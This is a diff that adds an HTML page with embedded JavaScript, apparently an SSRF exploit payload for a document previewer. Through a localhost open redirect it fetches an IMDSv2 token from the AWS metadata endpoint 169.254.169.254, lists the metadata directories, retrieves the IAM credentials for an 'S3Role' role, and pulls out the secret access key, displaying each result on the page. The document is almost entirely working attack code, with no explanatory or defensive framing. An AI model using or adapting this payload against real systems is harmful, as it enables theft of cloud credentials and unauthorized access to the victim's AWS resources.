@@ -1,0 +1,62 @@
+<html>
+<body>
+<style>
+h4 {
+    width: 1000px;
+    word-wrap: break-word;
+    overflow: wrap
+}
+</style>
+<h4 id='token'>"Token"</h4>
+<br></br>
+<h4 id='dirs'>"Dirs"</h4>
+<br></br>
+<h4 id='credentials'>Credentials</h4>
+<script type='text/javascript'>
+//Get token by sending http://localhost/redir.php?url=http://YOURSERVER/ to previewer
+var r = new XMLHttpRequest();
+var f = new XMLHttpRequest();
+let token = "";
+var s3role = "";
+r.open('PUT', 'http://localhost/redir.php?url=http://169.254.169.254/latest/api/token',false);
+r.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+r.onreadystatechange = function() {
+    if (r.readyState === 4){
+        if (r.status === 200 || r.status == 0){
+            document.getElementById('token').innerHTML = r.responseText;
+            token = r.responseText;
+        }
+    }
+}
+r.send();
+
+//Use token to get credentials
+f.open('GET','http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/',false);
+f.setRequestHeader('X-aws-ec2-metadata-token',token);
+f.onreadystatechange = function(){
+    if (f.readyState === 4){
+        if (f.status === 200 || r.status == 0){
+            document.getElementById('dirs').innerHTML = f.responseText;
+        }
+    }
+}
+f.send();
+
+//Use token to get credentials
+f.open('GET','http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',false);
+f.setRequestHeader('X-aws-ec2-metadata-token',token);
+f.onreadystatechange = function(){
+    if (f.readyState === 4){
+        if (f.status === 200 || r.status == 0){
+            document.getElementById('credentials').innerHTML = f.responseText;
+            s3role = JSON.parse(f.responseText)
+        }
+    }
+}
+f.send();
+
+token = s3role.token
+let secret_access_key = s3role.SecretAccessKey
+</script>
+</body>
+</html>
